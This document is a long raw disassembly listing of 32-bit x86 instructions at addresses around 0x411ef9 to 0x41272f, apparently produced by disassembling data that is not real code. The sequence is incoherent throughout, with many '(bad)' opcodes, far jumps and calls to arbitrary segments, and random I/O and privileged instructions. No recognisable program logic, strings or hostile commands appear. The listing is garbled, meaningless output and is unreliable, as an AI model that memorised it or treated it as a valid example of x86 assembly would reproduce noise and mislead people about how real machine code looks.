  411ef9:	push   esi
  411efa:	xchg   ebx,eax
  411efb:	or     BYTE PTR [esi],bl
  411efd:	nop
  411efe:	(bad)  
  411eff:	push   ebp
  411f00:	mov    edx,0x2ad1023e
  411f05:	xchg   esp,eax
  411f06:	ins    DWORD PTR es:[edi],dx
  411f07:	pop    ebx
  411f08:	ror    BYTE PTR ss:[edi+0x5fab75f5],0xf4
  411f10:	fs cld 
  411f12:	mov    al,0x52
  411f14:	dec    ecx
  411f15:	xchg   edx,eax
  411f16:	inc    ecx
  411f17:	mov    bl,0xee
  411f19:	stc    
  411f1a:	call   0x5a380524
  411f1f:	sub    esp,DWORD PTR [edx-0x5d458183]
  411f25:	mov    bh,0x1f
  411f27:	sbb    eax,0xe3339e73
  411f2c:	mov    ds:0xb35009ea,eax
  411f31:	cmp    DWORD PTR [eax+0x21],0xffffffa5
  411f35:	fst    st(5)
  411f37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f38:	push   ss
  411f39:	popa   
  411f3a:	sahf   
  411f3b:	push   edi
  411f3c:	xchg   ah,dh
  411f3e:	push   esi
  411f3f:	fwait
  411f40:	sbb    eax,0x273168a8
  411f45:	jns    0x411eef
  411f47:	ins    DWORD PTR es:[edi],dx
  411f48:	jae    0x411f44
  411f4a:	cmp    edx,DWORD PTR [ecx]
  411f4c:	ins    BYTE PTR es:[edi],dx
  411f4d:	fwait
  411f4e:	inc    eax
  411f4f:	sahf   
  411f50:	cmp    dh,BYTE PTR [ebx]
  411f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f53:	cld    
  411f54:	jb     0x411f14
  411f56:	xlat   BYTE PTR ds:[ebx]
  411f57:	retf   
  411f58:	mov    BYTE PTR [eax],0x59
  411f5b:	ret    
  411f5c:	int    0x30
  411f5e:	ss (bad) 
  411f60:	jnp    0x411fce
  411f62:	inc    ebx
  411f63:	mov    ebx,DWORD PTR [esi-0x766f7d63]
  411f69:	jno    0x411ef3
  411f6b:	std    
  411f6c:	scas   al,BYTE PTR es:[edi]
  411f6d:	pop    edx
  411f6e:	sub    eax,0xd7c3390
  411f73:	gs ds cmp WORD PTR gs:[edi+0x32a7ec25],bp
  411f7d:	pop    ebp
  411f7e:	xor    edi,DWORD PTR [edi-0x75]
  411f81:	loopne 0x411f9b
  411f83:	mov    ecx,0x90e61d6b
  411f89:	push   cs
  411f8a:	ins    BYTE PTR es:[edi],dx
  411f8b:	fs jge 0x411f3a
  411f8e:	inc    ebp
  411f8f:	and    DWORD PTR [ecx-0x15ed9613],ecx
  411f95:	add    bh,BYTE PTR [edi+0x54ab15bc]
  411f9b:	data16 or BYTE PTR [ecx+0x71fb7bb3],al
  411fa2:	sar    BYTE PTR [ebx+edx*2],cl
  411fa5:	mov    ebp,0x24d169b5
  411faa:	cld    
  411fab:	scas   eax,DWORD PTR es:[edi]
  411fac:	std    
  411fad:	cmp    esp,DWORD PTR [esi-0x7e]
  411fb0:	popf   
  411fb1:	adc    esi,eax
  411fb3:	shl    DWORD PTR [esi+0x49537796],0x39
  411fba:	fwait
  411fbb:	shr    bh,0x6e
  411fbe:	cdq    
  411fbf:	(bad)  
  411fc0:	retf   
  411fc1:	call   0x18d0421
  411fc6:	jbe    0x411fec
  411fc8:	mov    edi,DWORD PTR [edi+0x32]
  411fcb:	adc    al,0xa4
  411fcd:	sbb    BYTE PTR [esi-0xf1d0f49],0xf7
  411fd4:	clc    
  411fd5:	aaa    
  411fd6:	mov    al,0x78
  411fd8:	adc    al,0x8c
  411fda:	sahf   
  411fdb:	ins    BYTE PTR es:[edi],dx
  411fdc:	cmp    al,0xdf
  411fde:	fcom   QWORD PTR [ebx-0x76]
  411fe1:	cmp    ebx,DWORD PTR [edi-0x53]
  411fe4:	sbb    edi,DWORD PTR [edi-0x890ebe6]
  411fea:	mov    ebp,0x6e4a4ad0
  411fef:	mov    dh,0x82
  411ff1:	lds    esp,FWORD PTR [eax]
  411ff3:	pop    ss
  411ff4:	lods   eax,DWORD PTR ds:[esi]
  411ff5:	mov    edx,0xa3e2b5cb
  411ffa:	jp     0x411feb
  411ffc:	add    BYTE PTR [esi],al
  411ffe:	inc    ebp
  411fff:	pop    es
  412000:	or     BYTE PTR [edx],0x1e
  412003:	dec    esp
  412004:	hlt    
  412005:	int3   
  412006:	arpl   ax,dx
  412008:	(bad)  
  412009:	mov    ecx,0xa05f9094
  41200e:	inc    edx
  41200f:	clc    
  412010:	pop    ebx
  412011:	lods   al,BYTE PTR ds:[esi]
  412012:	lock ins BYTE PTR es:[edi],dx
  412014:	push   ecx
  412015:	push   ss
  412016:	cli    
  412017:	popf   
  412018:	jmp    0x7f3c:0x4a8a5995
  41201f:	push   edx
  412020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412021:	pop    ebp
  412022:	outs   dx,BYTE PTR ds:[esi]
  412023:	dec    ecx
  412024:	xchg   ecx,eax
  412025:	paddusb mm1,QWORD PTR [ebx+0x2c737337]
  41202c:	stos   DWORD PTR es:[edi],eax
  41202d:	jnp    0x4120a7
  41202f:	repz cli 
  412031:	push   ecx
  412032:	xchg   DWORD PTR [ebp+0x4442e51f],ebx
  412038:	ins    BYTE PTR es:[edi],dx
  412039:	mov    bh,0x95
  41203b:	dec    ebp
  41203c:	sti    
  41203d:	(bad)  
  41203e:	xlat   BYTE PTR ds:[ebx]
  41203f:	mov    ecx,DWORD PTR [edi-0x23]
  412042:	sub    esi,ecx
  412044:	ja     0x41207d
  412046:	xor    al,0xf3
  412048:	adc    eax,0x4fce2764
  41204d:	lods   al,BYTE PTR ds:[esi]
  41204e:	mov    ds:0x6265c5c6,eax
  412053:	inc    edi
  412054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412055:	jecxz  0x412018
  412057:	sahf   
  412058:	xchg   ebp,eax
  412059:	or     bl,BYTE PTR [eax+0x76]
  41205c:	aas    
  41205d:	mov    ch,0xa6
  41205f:	mov    esi,0x5839fdbd
  412065:	jns    0x411ff6
  412067:	sub    al,0x14
  412069:	shl    DWORD PTR [eax-0xd],cl
  41206c:	pop    edi
  41206d:	lods   eax,DWORD PTR ds:[esi]
  41206e:	fwait
  41206f:	and    eax,0x2cf05729
  412074:	outs   dx,DWORD PTR ds:[esi]
  412075:	jae    0x41209b
  412077:	sub    DWORD PTR [ecx],edx
  412079:	outs   dx,DWORD PTR ds:[esi]
  41207a:	out    dx,eax
  41207b:	les    eax,FWORD PTR [edi-0x15a3480d]
  412081:	test   DWORD PTR [edx+0x6ae62124],esp
  412087:	in     al,0xa2
  412089:	test   BYTE PTR [ecx],bl
  41208b:	ins    DWORD PTR es:[edi],dx
  41208c:	scas   al,BYTE PTR es:[edi]
  41208d:	sub    BYTE PTR [ebx+0x3612b285],cl
  412093:	gs jp  0x4120b1
  412096:	or     ebx,DWORD PTR [ecx-0x2f]
  412099:	dec    ebx
  41209a:	lods   eax,DWORD PTR ds:[esi]
  41209b:	dec    ebx
  41209c:	fs call 0x9775:0xf30a3a85
  4120a4:	mov    dl,BYTE PTR [esi]
  4120a6:	xor    BYTE PTR [edi+0x7a],ch
  4120a9:	aad    0xe6
  4120ab:	repz aad 0x3a
  4120ae:	lds    ebp,FWORD PTR [ecx+0x2713ddbf]
  4120b4:	xchg   edi,eax
  4120b5:	sub    al,0x83
  4120b7:	xchg   edx,eax
  4120b8:	xchg   edi,eax
  4120b9:	mov    ebp,0xf042903d
  4120be:	inc    esp
  4120bf:	pop    edx
  4120c0:	sub    ebp,DWORD PTR [ecx+0x65]
  4120c3:	addr16 push edx
  4120c5:	fiadd  WORD PTR [ebp-0x5]
  4120c8:	fmul   DWORD PTR [esp+esi*2-0x36]
  4120cc:	inc    esp
  4120cd:	mov    ebp,0xa48719de
  4120d2:	cmp    eax,0x8f7fc909
  4120d7:	sub    DWORD PTR [ecx+0x465f2b6f],0x443ae590
  4120e1:	repnz daa 
  4120e3:	jmp    0x4120e8
  4120e5:	pop    esi
  4120e6:	lods   eax,DWORD PTR ds:[esi]
  4120e7:	dec    ecx
  4120e8:	pop    eax
  4120e9:	ins    DWORD PTR es:[edi],dx
  4120ea:	sub    ebx,DWORD PTR [ecx+edx*1]
  4120ed:	or     al,0x98
  4120ef:	scas   al,BYTE PTR es:[edi]
  4120f0:	mov    esp,0xfec3cebf
  4120f5:	test   DWORD PTR [ebx],edi
  4120f7:	adc    eax,0x529498af
  4120fc:	mov    dl,0x54
  4120fe:	dec    esi
  4120ff:	inc    ecx
  412100:	into   
  412101:	leave  
  412102:	xor    BYTE PTR [ebx+0x6f2874d],ah
  412108:	jae    0x41212f
  41210a:	(bad)  [ecx]
  41210c:	xor    eax,0xcb4c1886
  412111:	sar    ebp,1
  412113:	sub    eax,0xf989a136
  412118:	(bad)  [esi+ecx*2+0x3b59eb74]
  41211f:	mov    ecx,0x7000a33a
  412124:	fs mov esp,0x1658b6f8
  41212a:	xchg   BYTE PTR [esi+0x75],bh
  41212d:	or     DWORD PTR [ebp+0xebf00b8],ebx
  412133:	jl     0x4120e8
  412135:	clc    
  412136:	mov    ecx,0xcd620506
  41213b:	push   edx
  41213c:	push   cs
  41213d:	aam    0xd1
  41213f:	dec    ecx
  412140:	dec    edx
  412141:	popf   
  412142:	mov    ch,0x81
  412144:	dec    eax
  412145:	jne    0x4121bf
  412147:	sbb    eax,DWORD PTR [esi+0x67]
  41214a:	xor    ebp,DWORD PTR [ebp+0x20b5d868]
  412150:	cmp    BYTE PTR [esi+0x55],al
  412153:	inc    ebx
  412154:	jmp    0x412102
  412156:	or     eax,0xc8ef512
  41215b:	dec    ecx
  41215c:	mov    dh,0xe3
  41215e:	fcomip st,st(5)
  412160:	arpl   WORD PTR [edx-0x18],di
  412163:	int3   
  412164:	mov    ebp,DWORD PTR [ebx+0x66ed7330]
  41216a:	ja     0x4120f9
  41216c:	stos   DWORD PTR es:[edi],eax
  41216d:	popf   
  41216e:	imul   BYTE PTR ds:0x5035c66
  412174:	cdq    
  412175:	xchg   edi,eax
  412176:	jle    0x4121b0
  412178:	dec    eax
  412179:	clc    
  41217a:	sub    bh,bh
  41217c:	fiadd  WORD PTR [edi-0x2]
  41217f:	mov    ds,WORD PTR [edx+0x43585349]
  412185:	cmc    
  412186:	stos   BYTE PTR es:[edi],al
  412187:	mov    ebp,0xdd56f521
  41218c:	pop    ds
  41218d:	cmp    DWORD PTR [ecx-0x28d5dbd4],edi
  412193:	clc    
  412194:	test   eax,0x7ddc64c6
  412199:	jno    0x412142
  41219b:	clc    
  41219c:	ja     0x412167
  41219e:	(bad)  
  41219f:	adc    edi,DWORD PTR [ecx]
  4121a1:	xor    al,0x76
  4121a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121a4:	call   0x777:0x89120f07
  4121ab:	jne    0x41212e
  4121ad:	push   0xc4ebd6bb
  4121b2:	xchg   ebx,eax
  4121b3:	out    dx,al
  4121b4:	mov    esi,0x7778467b
  4121b9:	mov    dl,0x1f
  4121bb:	xchg   edx,eax
  4121bc:	mov    ?,WORD PTR [ebp+eiz*8+0x2a3614aa]
  4121c3:	fs icebp 
  4121c5:	adc    dh,BYTE PTR [ebp+0xe]
  4121c8:	pop    es
  4121c9:	cmp    esi,edx
  4121cb:	jg     0x412152
  4121cd:	lods   eax,DWORD PTR ds:[esi]
  4121ce:	jae    0x412238
  4121d0:	jae    0x4121f0
  4121d2:	rol    DWORD PTR [edi-0xd],cl
  4121d5:	push   esp
  4121d6:	hlt    
  4121d7:	rcl    BYTE PTR [edx+eiz*2-0x432700ec],1
  4121de:	gs lods al,BYTE PTR cs:[esi]
  4121e1:	icebp  
  4121e2:	inc    eax
  4121e3:	sub    al,0xe
  4121e5:	mov    eax,DWORD PTR [edi]
  4121e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121e8:	bound  ebx,QWORD PTR [edx-0x1b78e352]
  4121ee:	outs   dx,DWORD PTR ds:[esi]
  4121ef:	jecxz  0x4121fb
  4121f1:	ror    BYTE PTR [edx-0x72],0x91
  4121f5:	nop
  4121f6:	inc    ebx
  4121f7:	adc    al,0x11
  4121f9:	mov    ds:0xa55e5c4a,al
  4121fe:	and    eax,0x93aff59d
  412203:	in     al,0x84
  412205:	pop    esp
  412206:	out    0xbe,eax
  412208:	repnz or dh,BYTE PTR [eax+ebp*1+0x7d88ac0]
  412210:	mov    bl,0xb9
  412212:	push   es
  412213:	call   0xcaeb9a3c
  412218:	pmaxub mm0,QWORD PTR [eax-0x29]
  41221c:	push   esp
  41221d:	imul   ebx,DWORD PTR [esi-0x12],0xffffffaf
  412221:	xchg   esp,eax
  412222:	xlat   BYTE PTR ds:[ebx]
  412223:	imul   ebp,DWORD PTR [ebx-0x3d],0x8
  412227:	push   0xd
  412229:	push   esp
  41222a:	inc    edx
  41222b:	cmp    dh,BYTE PTR [eax]
  41222d:	dec    ecx
  41222e:	mov    bh,0x27
  412230:	outs   dx,DWORD PTR ds:[esi]
  412231:	sbb    eax,0x79d9d7aa
  412236:	sub    DWORD PTR [eax+0x44],esi
  412239:	sbb    bl,0x60
  41223c:	cld    
  41223d:	dec    ecx
  41223e:	sahf   
  41223f:	inc    ebx
  412240:	hlt    
  412241:	lods   eax,DWORD PTR ds:[esi]
  412242:	ror    BYTE PTR [ebp-0x333ce7f7],cl
  412248:	jmp    0xe409b6f
  41224d:	xchg   ecx,eax
  41224e:	daa    
  41224f:	adc    eax,0x8c987ec5
  412254:	fcomi  st,st(5)
  412256:	pop    es
  412257:	pop    edx
  412258:	(bad)  
  412259:	popa   
  41225a:	jp     0x41221c
  41225c:	(bad)  
  41225d:	push   cs
  41225e:	push   0x98fba7
  412263:	jo     0x4121ff
  412265:	jbe    0x41227a
  412267:	and    al,0x50
  412269:	jns    0x4122e4
  41226b:	dec    edx
  41226c:	(bad)  
  41226d:	or     eax,ecx
  41226f:	call   0xdc7a4b7f
  412274:	adc    bh,BYTE PTR [edx-0x6]
  412277:	fs jb  0x4122d1
  41227a:	cmc    
  41227b:	clc    
  41227c:	and    edx,DWORD PTR ds:[eax]
  41227f:	cmp    al,0xa6
  412281:	lea    ebp,[edi+0x1]
  412284:	imul   ecx,DWORD PTR [edx+ebp*2+0x576af7d8],0xffffffb0
  41228c:	retf   
  41228d:	sub    cl,dl
  41228f:	hlt    
  412290:	out    0xc9,eax
  412292:	add    eax,0xeb6484d8
  412297:	xor    ah,BYTE PTR [ebx+ebx*4-0x50f9943]
  41229e:	sar    BYTE PTR [esi+ecx*4-0x6506246c],1
  4122a5:	push   edx
  4122a6:	ror    BYTE PTR [edi+0x704a9424],1
  4122ac:	dec    eax
  4122ad:	ds mov ebp,0xfcac7236
  4122b3:	mov    ah,0x1
  4122b5:	mov    ds:0xed290a17,eax
  4122ba:	inc    esp
  4122bb:	jno    0x412268
  4122bd:	jns    0x4122d0
  4122bf:	pop    ebp
  4122c0:	jb     0x412322
  4122c2:	xor    eax,0xe97d9fb8
  4122c7:	and    al,ch
  4122c9:	sub    ebp,0x58
  4122cc:	inc    BYTE PTR [edi]
  4122ce:	in     eax,dx
  4122cf:	cmp    cl,BYTE PTR [edx]
  4122d1:	jecxz  0x412273
  4122d3:	aas    
  4122d4:	pop    edx
  4122d5:	push   cs
  4122d6:	iret   
  4122d7:	jecxz  0x412260
  4122d9:	xchg   ecx,eax
  4122da:	call   DWORD PTR [ecx+0x6841ba90]
  4122e0:	inc    esp
  4122e1:	add    DWORD PTR [edx+0x4e],esp
  4122e4:	sbb    esp,ebp
  4122e6:	xchg   ebp,eax
  4122e7:	add    DWORD PTR [edi+0x68],esp
  4122ea:	mov    al,0x17
  4122ec:	stos   BYTE PTR es:[edi],al
  4122ed:	sub    DWORD PTR [ecx+0x2c5a9421],ecx
  4122f3:	push   es
  4122f4:	loop   0x4122b2
  4122f6:	jp     0x412302
  4122f8:	cwde   
  4122f9:	mov    eax,ds:0x3b0433c5
  4122fe:	inc    esi
  4122ff:	cmp    bh,BYTE PTR [edi+0x430a258e]
  412305:	repnz adc dl,BYTE PTR [ecx+0x6c917680]
  41230c:	iret   
  41230d:	adc    DWORD PTR [esi-0x10596121],edi
  412313:	daa    
  412314:	daa    
  412315:	loopne 0x412340
  412317:	and    DWORD PTR [edi],ecx
  412319:	int    0xd4
  41231b:	ficom  DWORD PTR [eax+eax*4-0x61]
  41231f:	push   ecx
  412320:	or     DWORD PTR [ebx],esp
  412322:	push   0x30
  412324:	cmp    al,0x11
  412326:	cmp    ecx,DWORD PTR [ebp-0x280060d3]
  41232c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41232d:	into   
  41232e:	push   edx
  41232f:	add    DWORD PTR [ebx],ecx
  412331:	mov    cl,BYTE PTR [eax]
  412333:	mov    ds:0x9d0f8d5d,al
  412338:	mov    ah,0x55
  41233a:	out    0xc1,eax
  41233c:	jecxz  0x4123a6
  41233e:	aas    
  41233f:	rol    DWORD PTR [ebp-0x44cfe0c6],1
  412345:	mov    cl,0xf7
  412347:	add    dh,BYTE PTR [eax+ebp*8-0x4da7ca38]
  41234e:	sbb    BYTE PTR [edx-0x2b074b96],ah
  412354:	pop    ebx
  412355:	sbb    BYTE PTR [eax+0x26],bh
  412358:	and    edx,DWORD PTR [ecx-0x6a59bcd1]
  41235e:	shl    DWORD PTR [edx-0x442f6c06],cl
  412364:	mul    DWORD PTR [ecx+0xf]
  412367:	adc    DWORD PTR [ecx+0x25],edx
  41236a:	xor    ecx,ebx
  41236c:	out    0x91,al
  41236e:	call   0xcff25ffc
  412373:	adc    bl,BYTE PTR [ebx+ebp*2]
  412376:	push   cs
  412377:	xchg   ah,ah
  412379:	or     al,0xc1
  41237b:	add    DWORD PTR [ebp+0x11b5d61f],0x65
  412382:	add    esi,edx
  412384:	mov    al,ds:0xe7e1afc7
  412389:	jo     0x41236a
  41238b:	jmp    0xeb19211d
  412390:	lds    esp,FWORD PTR [edx+0x77]
  412393:	sub    BYTE PTR [edi-0x52],cl
  412396:	adc    BYTE PTR [esi],ch
  412398:	sub    DWORD PTR [ebp+0x71],ebx
  41239b:	push   ecx
  41239c:	xchg   esi,eax
  41239d:	push   ebp
  41239e:	retf   0x865c
  4123a1:	loopne 0x41237a
  4123a3:	and    al,0x9d
  4123a5:	out    0xfb,al
  4123a7:	lahf   
  4123a8:	jnp    0x412363
  4123aa:	push   cs
  4123ab:	repz mov edi,0xb4cb6ed
  4123b1:	mov    esi,0x72775be1
  4123b6:	scas   eax,DWORD PTR es:[edi]
  4123b7:	mov    eax,ds:0x29857c1a
  4123bc:	jl     0x41234c
  4123be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123bf:	mov    dl,0x6a
  4123c1:	jb     0x4123e4
  4123c3:	mov    eax,0x3a4536e1
  4123c8:	shr    BYTE PTR [ecx+0x2f],cl
  4123cb:	out    dx,eax
  4123cc:	sbb    al,dl
  4123ce:	(bad)  
  4123cf:	cmp    ebp,edx
  4123d1:	jmp    0xe0:0xa6adf193
  4123d8:	sub    al,0xbd
  4123da:	dec    edx
  4123db:	out    0xb4,eax
  4123dd:	add    eax,0xc606b5c8
  4123e2:	inc    edi
  4123e3:	mov    WORD PTR [edx+esi*1-0x5124eedd],gs
  4123ea:	cmp    BYTE PTR ds:0x1c999612,dl
  4123f0:	pop    edi
  4123f1:	xor    ah,0xe5
  4123f4:	xchg   DWORD PTR [ebx+0xa],eax
  4123f7:	(bad)  
  4123f8:	mov    ch,0x16
  4123fa:	std    
  4123fb:	xchg   ebp,eax
  4123fc:	es sbb al,0x5f
  4123ff:	adc    ebp,0x68
  412402:	xor    al,0x4
  412404:	mov    edx,0x752d62b6
  412409:	mov    bh,0x66
  41240b:	ror    DWORD PTR [esi+0xf96c21e],cl
  412411:	and    bl,0xe2
  412414:	push   eax
  412415:	addr16 pop ss
  412417:	pop    esi
  412418:	fisubr DWORD PTR [ebx+eax*2]
  41241b:	jns    0x412424
  41241d:	icebp  
  41241e:	popf   
  41241f:	aaa    
  412420:	pop    edi
  412421:	fisttp QWORD PTR [ecx+ebx*1+0x6d755eed]
  412428:	mov    al,ds:0x793675a5
  41242d:	dec    ebp
  41242e:	and    DWORD PTR [ecx],edx
  412430:	pop    edx
  412431:	xchg   ecx,eax
  412432:	retf   0xc091
  412435:	aas    
  412436:	inc    eax
  412437:	aas    
  412438:	pop    ss
  412439:	iret   
  41243a:	cmp    eax,0xe3bd11c2
  41243f:	cmp    BYTE PTR [edi+0x2d],bh
  412442:	mov    al,ds:0x8f4be574
  412447:	push   0xffffff8d
  412449:	es sbb al,0xf3
  41244c:	aas    
  41244d:	dec    DWORD PTR [eax+esi*1+0x6b]
  412451:	popf   
  412452:	scas   eax,DWORD PTR es:[edi]
  412453:	test   BYTE PTR [esi+0x3f9f9ef7],ah
  412459:	outs   dx,DWORD PTR ds:[esi]
  41245a:	leave  
  41245b:	jb     0x4123f2
  41245d:	dec    ebp
  41245e:	jmp    0x7be218e0
  412463:	daa    
  412464:	dec    edx
  412465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412466:	dec    esp
  412467:	xchg   ecx,eax
  412468:	mov    ds:0xc6b440df,al
  41246d:	jp     0x412431
  41246f:	mov    cl,0x33
  412471:	retf   0x1c6e
  412474:	mov    edx,DWORD PTR [esi+esi*2-0x8]
  412478:	sbb    DWORD PTR [ebp+0x7cafce4c],0xffffffe8
  41247f:	push   0x38d54c69
  412484:	dec    eax
  412485:	inc    esp
  412486:	mov    edi,DWORD PTR [eax-0x39]
  412489:	mov    bl,0x2b
  41248b:	test   DWORD PTR [edi],0x60c0ee83
  412491:	sbb    bh,BYTE PTR [ebp-0x51]
  412494:	mov    cl,BYTE PTR [ebp+0x17]
  412497:	cmp    al,0xd9
  412499:	test   BYTE PTR [eax],0x0
	...
  412514:	cmp    BYTE PTR [edx-0x26147f15],dh
  41251a:	jnp    0x4124d6
  41251c:	imul   ecx,DWORD PTR [edx],0x6
  41251f:	and    ebx,edi
  412521:	fadd   DWORD PTR [edx+0xce392b]
  412527:	add    BYTE PTR [esi+0x7],ch
  41252a:	add    BYTE PTR [eax],al
  41252c:	pop    ss
  41252d:	sbb    eax,0xc489df69
  412532:	int3   
  412533:	popf   
  412534:	dec    esp
  412535:	sub    BYTE PTR [ebx+0x26b3ebc9],0xb6
  41253c:	push   esi
  41253d:	push   0xf0a1ef69
  412542:	dec    ecx
  412543:	xchg   ebx,eax
  412544:	lods   al,BYTE PTR ds:[esi]
  412545:	loopne 0x412527
  412547:	xchg   ebp,eax
  412548:	push   edi
  412549:	popf   
  41254a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41254b:	jle    0x41253a
  41254d:	inc    eax
  41254e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41254f:	fisubr DWORD PTR [eax]
  412551:	jge    0x412528
  412553:	int    0x7c
  412555:	xchg   edi,eax
  412556:	das    
  412557:	and    eax,DWORD PTR [eax]
  412559:	lods   al,BYTE PTR ds:[esi]
  41255a:	sbb    BYTE PTR [esi],cl
  41255c:	adc    bh,BYTE PTR [edi+edx*8+0x76b2ff01]
  412563:	ret    0x9d79
  412566:	ds gs in eax,dx
  412569:	mov    ah,0x3e
  41256b:	gs aad 0x69
  41256e:	jmp    0x4124f5
  412570:	push   ss
  412571:	mov    BYTE PTR [ecx-0x79ffc0c0],al
  412577:	lds    ebp,FWORD PTR [eax-0x7d]
  41257a:	or     edi,DWORD PTR [edi]
  41257c:	enter  0xa261,0x53
  412580:	icebp  
  412581:	in     eax,0xf
  412583:	call   0x8644:0x515ad992
  41258a:	ins    BYTE PTR es:[edi],dx
  41258b:	jbe    0x4125bb
  41258d:	jne    0x412573
  41258f:	and    eax,0xc6578e06
  412594:	jb     0x4125e1
  412596:	mov    al,0x5e
  412598:	cmp    BYTE PTR [edx+0x1f],bl
  41259b:	mov    al,ds:0xbd309466
  4125a0:	(bad)  
  4125a1:	aad    0x0
  4125a3:	enter  0xbed9,0x9
  4125a7:	push   esp
  4125a8:	or     eax,0xb3ec2dd4
  4125ad:	test   bl,ah
  4125af:	cmp    al,0x4
  4125b1:	fiadd  DWORD PTR [edi]
  4125b3:	dec    ebp
  4125b4:	mov    eax,0x3085b2af
  4125b9:	xlat   BYTE PTR ds:[ebx]
  4125ba:	and    edx,DWORD PTR [ebp-0x5a219a37]
  4125c0:	sub    al,0x18
  4125c2:	sbb    bh,BYTE PTR [esi-0x6c50ab89]
  4125c8:	loop   0x4125f1
  4125ca:	aaa    
  4125cb:	mov    edi,0xba5f65e5
  4125d0:	mov    BYTE PTR [ebx-0x738ee384],0x86
  4125d7:	inc    eax
  4125d8:	xchg   edi,eax
  4125d9:	int    0xd3
  4125db:	lods   al,BYTE PTR ds:[esi]
  4125dc:	and    bh,BYTE PTR [ecx]
  4125de:	pop    esp
  4125df:	ja     0x4125e3
  4125e1:	les    esp,FWORD PTR [eax-0x1d3df199]
  4125e7:	inc    esp
  4125e8:	mov    ch,0x3
  4125ea:	inc    ebp
  4125eb:	nop
  4125ec:	jl     0x4125ec
  4125ee:	sub    bl,cl
  4125f0:	dec    eax
  4125f1:	dec    esi
  4125f2:	xchg   DWORD PTR [ebx],ecx
  4125f4:	mov    dh,0xfa
  4125f6:	mov    dl,0x49
  4125f8:	jns    0x412617
  4125fa:	push   eax
  4125fb:	adc    eax,0x12ce035
  412600:	(bad)  
  412602:	sub    BYTE PTR [edi-0x68],cl
  412605:	jecxz  0x41258c
  412607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412608:	int    0x33
  41260a:	out    0x1f,al
  41260c:	fwait
  41260d:	jecxz  0x41265f
  41260f:	pop    ebp
  412610:	pcmpeqd mm1,mm4
  412613:	or     eax,0xdb09460e
  412618:	and    al,0xe3
  41261a:	aaa    
  41261b:	xchg   ebx,eax
  41261c:	mov    al,ds:0x6ab8c2c0
  412621:	xchg   esi,eax
  412623:	sbb    eax,0xf033ae2b
  412628:	sbb    al,0x27
  41262a:	lods   eax,DWORD PTR ds:[esi]
  41262b:	mov    ebx,0xb96af6e
  412630:	adc    DWORD PTR [edi+0x7f],ebp
  412633:	xchg   edx,eax
  412634:	shr    DWORD PTR [eax-0x355684ba],0xcd
  41263b:	push   ds
  41263c:	xchg   ebx,eax
  41263d:	mov    esi,DWORD PTR [esi+0x2e]
  412640:	cmp    cl,BYTE PTR [ebx-0x75]
  412643:	add    al,0x4d
  412645:	in     al,dx
  412646:	sub    bl,0x15
  412649:	test   DWORD PTR [esi+0x3d381d1a],ebp
  41264f:	push   0x53
  412651:	rcl    DWORD PTR [edx+0x311234a9],cl
  412657:	dec    esp
  412658:	jmp    0x4126cf
  41265a:	lahf   
  41265b:	inc    edi
  41265c:	das    
  41265d:	cld    
  41265e:	ins    DWORD PTR es:[edi],dx
  41265f:	mov    edi,0xa9e9e679
  412664:	pusha  
  412665:	push   cs
  412666:	inc    ebx
  412667:	cmp    DWORD PTR [ebp-0x1b57475a],0x7571e606
  412671:	dec    ebx
  412672:	mov    ds:0x4d5ae913,al
  412677:	pop    ebx
  412678:	lea    edi,[eax]
  41267a:	mov    al,ds:0x68740261
  41267f:	jmp    0x412624
  412681:	add    eax,0xe4c2e252
  412686:	mov    edx,0xa1076c05
  41268b:	push   esp
  41268c:	inc    edi
  41268d:	xor    esp,DWORD PTR [esp+ebx*1]
  412690:	and    ebx,DWORD PTR [edx]
  412692:	shl    BYTE PTR [esi],0xf7
  412695:	sbb    ebp,DWORD PTR [ebp-0x57e9e2f6]
  41269b:	mov    ch,0xe1
  41269d:	shl    BYTE PTR [ebp+0x3497db65],0xe3
  4126a4:	aaa    
  4126a5:	icebp  
  4126a6:	clc    
  4126a7:	jnp    0x4126d1
  4126a9:	inc    ebp
  4126aa:	adc    DWORD PTR [esi+0x7e],ebp
  4126ad:	adc    esi,DWORD PTR fs:[esi-0x399c20f9]
  4126b4:	(bad)  
  4126b5:	push   edi
  4126b6:	push   edi
  4126b7:	inc    ebx
  4126b8:	mov    dl,0x68
  4126ba:	sub    bl,BYTE PTR [ebx+esi*2-0x2e]
  4126be:	mov    DWORD PTR [ebp-0x723ac21a],esp
  4126c4:	std    
  4126c5:	dec    esp
  4126c6:	xor    dh,BYTE PTR [eax-0x6f0a90a3]
  4126cc:	mov    eax,0x27dda7d9
  4126d1:	mov    al,ds:0x9968c92
  4126d6:	js     0x412677
  4126d8:	punpckhwd mm3,mm5
  4126db:	sahf   
  4126dc:	aam    0x6d
  4126de:	in     al,0xe3
  4126e0:	data16 mov ds:0xa88c5090,al
  4126e6:	aaa    
  4126e7:	push   ebx
  4126e8:	sbb    al,0x54
  4126ea:	lock and al,0x13
  4126ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126ee:	shl    ch,1
  4126f0:	mov    ds:0x8f1531ea,al
  4126f5:	nop
  4126f6:	xchg   DWORD PTR [eax+0x6f],esi
  4126f9:	adc    ecx,DWORD PTR [ecx+ebx*2]
  4126fc:	adc    eax,0xba50268
  412701:	mov    dl,BYTE PTR [edi]
  412703:	mov    ds:0xce8b2ff8,eax
  412708:	les    ebp,FWORD PTR ds:0xc42340c1
  41270e:	inc    esp
  41270f:	stos   DWORD PTR es:[edi],eax
  412710:	pop    ss
  412711:	sbb    eax,0xc9af428b
  412716:	add    eax,0x4a18fe69
  41271b:	fisttp WORD PTR [ebx-0x7f]
  41271e:	or     BYTE PTR [ecx+ebp*2-0x78],dl
  412722:	pop    ebp
  412723:	in     al,0x80
  412725:	imul   DWORD PTR [eax]
  412727:	jle    0x4126f6
  412729:	mov    edi,0x97f101d
  41272e:	ins    DWORD PTR es:[edi],dx
  41272f:	mov    bl,0xdd
